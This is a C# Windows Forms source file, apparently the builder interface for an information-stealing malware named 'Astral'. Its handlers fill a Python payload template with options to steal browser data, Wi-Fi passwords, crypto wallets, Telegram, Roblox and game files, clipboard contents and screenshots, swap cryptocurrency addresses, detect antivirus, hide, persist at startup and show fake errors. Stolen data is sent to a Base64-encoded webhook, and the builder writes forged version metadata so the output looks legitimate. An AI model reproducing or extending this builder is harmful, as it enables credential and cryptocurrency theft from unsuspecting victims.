            UpdatePythonCode("MPALAGZBLL", _XCHAIN_address_Options.Text);
        }

        private void B64_WBH_STR_TextChanged(object sender, EventArgs e)
        {
            try
            {
                // Encoder le contenu du champ de texte en Base64
                string originalText = B64_WBH_STR.Text;
                byte[] bytesToEncode = Encoding.UTF8.GetBytes(originalText);
                string base64EncodedText = Convert.ToBase64String(bytesToEncode);

                // Mettre à jour le champ de texte avec le texte encodé en Base64
                B64_WBH_STR.TextChanged -= B64_WBH_STR_TextChanged; // Désactiver l'événement pour éviter une boucle infinie
                B64_WBH_STR.Text = base64EncodedText;
                B64_WBH_STR.TextChanged += B64_WBH_STR_TextChanged; // Réactiver l'événement
            }
            catch (Exception ex)
            {
                // Gérer les exceptions ici
                MessageBox.Show($"Une erreur s'est produite lors de l'encodage en Base64 : {ex.Message}", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void PACHAIN_address_Options_TextChanged(object sender, EventArgs e)
        {
            UpdatePythonCode("MPLAO55599BL", PACHAIN_address_Options.Text);
        }

        private void CCHAIN_address_Options_TextChanged(object sender, EventArgs e)
        {
            UpdatePythonCode("LOGZKNNNN", CCHAIN_address_Options.Text);
        }

        private void MONERO_address_Options_TextChanged(object sender, EventArgs e)
        {
            UpdatePythonCode("AKEOZDSON9N", MONERO_address_Options.Text);
        }

        private void ADA_address_Options_TextChanged(object sender, EventArgs e)
        {
            UpdatePythonCode("AEZAZRETG55", ADA_address_Options.Text);
        }

        private void DASH_address_Options_TextChanged(object sender, EventArgs e)
        {
            UpdatePythonCode("AEZ56TRYY5", DASH_address_Options.Text);
        }

        private void ClipBoard_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = ClipBoard_Options.Checked ? "yes" : "no";
            UpdatePythonCode("clipboard_found", value);
        }

        private void Wifi_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Wifi_Options.Checked ? "yes" : "no";
            UpdatePythonCode("w1f1_found", value);
        }

        private void Hide_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Hide_Options.Checked ? "yes" : "no";
            UpdatePythonCode("hide_config", value);
        }

        private void Startup_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Startup_Options.Checked ? "yes" : "no";
            UpdatePythonCode("startup_config", value);
        }

        private void _error_thiefcat_CheckedChanged(object sender, EventArgs e)
        {
            string value = _error_thiefcat.Checked ? "yes" : "no";
            UpdatePythonCode("fake_error_config", value);
        }

        private void CryptoReplacer_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = CryptoReplacer_Options.Checked ? "yes" : "no";
            UpdatePythonCode("MPALFLLLL", value);
        }

        private void InjectBrowsers_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = InjectBrowsers_Options.Checked ? "yes" : "no";
            UpdatePythonCode("chromenject_config", value);
        }

        private void _Games_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = _Games_Options.Checked ? "yes" : "no";
            UpdatePythonCode("files_mc", value);
        }

        private void _GetBrowsers_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = _GetBrowsers_Options.Checked ? "yes" : "no";
            UpdatePythonCode("browsers_found", value);
        }

        private void Crypto_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Crypto_Options.Checked ? "yes" : "no";
            UpdatePythonCode("crypto_found", value);
        }

        private void Sys_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Sys_Options.Checked ? "yes" : "no";
            UpdatePythonCode("sys_found", value);
        }

        private void Roblox_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Roblox_Options.Checked ? "yes" : "no";
            UpdatePythonCode("roblox_found", value);
        }

        private void Screen_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Screen_Options.Checked ? "yes" : "no";
            UpdatePythonCode("screen_found", value);
        }

        private void _Found_Launcher_CheckedChanged(object sender, EventArgs e)
        {
            string value = _Found_Launcher.Checked ? "yes" : "no";
            UpdatePythonCode("launcher_found", value);
        }

        private void Telegram_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = Telegram_Options.Checked ? "yes" : "no";
            UpdatePythonCode("telegram_found", value);
        }

        private void AntiVirus_Options_CheckedChanged(object sender, EventArgs e)
        {
            string value = AntiVirus_Options.Checked ? "yes" : "no";
            UpdatePythonCode("found_av", value);
        }

        private void guna2CircleButton1_Click_1(object sender, EventArgs e)
        {
            Close();
        }

        private void UpdatePythonCode(string optionName, string value)
        {
            pythonCodeTemplate = pythonCodeTemplate.Replace($"\"{optionName}\": \"%%{optionName}%%\"", $"\"{optionName}\": \"{value}\"");
        }

        private void encryption_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void compil_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2CircleButton2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void github_Click(object sender, EventArgs e)
        {
            try
            {
                string url = "https://www.github.com/freeman649";

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                };

                Process.Start(psi);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void discord_Click(object sender, EventArgs e)
        {
            try
            {
                string url = "https://discord.gg/DjpfZ9hUwY";

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                };

                Process.Start(psi);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void twitch_Click(object sender, EventArgs e)
        {
            try
            {
                string url = "https://www.twitch.tv/freeman649";

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                };

                Process.Start(psi);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void youtube_Click(object sender, EventArgs e)
        {
            try
            {
                string url = "https://www.youtube.com/@freeman649gd9";

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                };

                Process.Start(psi);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void TestWebhook_Click(object sender, EventArgs e)
        {
            string webhookUrl = Encoding.UTF8.GetString(Convert.FromBase64String(B64_WBH_STR.Text));
            string message = "{\"content\":\"Your Webhook is working successfully ✅\"}";

            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(message, Encoding.UTF8, "application/json");

                try
                {
                    HttpResponseMessage response = await client.PostAsync(webhookUrl, content);
                    response.EnsureSuccessStatusCode();
                    TestWebhook.FillColor = Color.Green; // Change button color to green
                    MessageBox.Show("Message sent successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    TestWebhook.FillColor = Color.Red; // Change button color to red
                    MessageBox.Show($"Error sending message: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void UpdateVersionFile()
        {
            try
            {
                string filePath = @"Astral_assets\version\version.txt";
                string versionInfo = $@"
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(6, 1, 7601, 17514),
    prodvers=(6, 1, 7601, 17514),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'{CompanyName.Text}'),
        StringStruct(u'FileDescription', u'{FileDescription.Text}'),
        StringStruct(u'FileVersion', u'{FileVersion.Text}'),
        StringStruct(u'InternalName', u'{InternalName.Text}'),
        StringStruct(u'InternalName', u'{InternalName2.Text}'),
        StringStruct(u'OriginalFilename', u'{OriginalFilename.Text}'),
        StringStruct(u'ProductName', u'{ProductName.Text}'),
        StringStruct(u'ProductVersion', u'{ProductVersion.Text}')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)";
                File.WriteAllText(filePath, versionInfo);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error updating version file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void CompanyName_TextChanged(object sender, EventArgs e)
        {
            UpdateVersionFile();
        }

        private void FileDescription_TextChanged(object sender, EventArgs e)
        {
            UpdateVersionFile();
        }

        private void FileVersion_TextChanged(object sender, EventArgs e)
        {
            UpdateVersionFile();
        }

        private void InternalName_TextChanged(object sender, EventArgs e)
        {
            UpdateVersionFile();
        }

        private void InternalName2_TextChanged(object sender, EventArgs e)
        {
            UpdateVersionFile();
        }

        private void OriginalFilename_TextChanged(object sender, EventArgs e)
        {
            UpdateVersionFile();
        }

        private void ProductName_TextChanged(object sender, EventArgs e)
        {
            UpdateVersionFile();
        }

        private void ProductVersion_TextChanged(object sender, EventArgs e)
        {
            UpdateVersionFile();
        }

        private void LinkToIcon_TextChanged(object sender, EventArgs e)
        {

        }

        private void IconSelector_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Icon Files (*.ico)|*.ico"; // Filtrer pour ne montrer que les fichiers .ico

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                LinkToIcon.Text = openFileDialog.FileName; // Mettre à jour le champ de texte avec le chemin de l'icône sélectionnée
            }
        }

        private void ExeNameOutput_TextChanged(object sender, EventArgs e)
        {
            exeFileName = ExeNameOutput.Text;
        }
    }
}
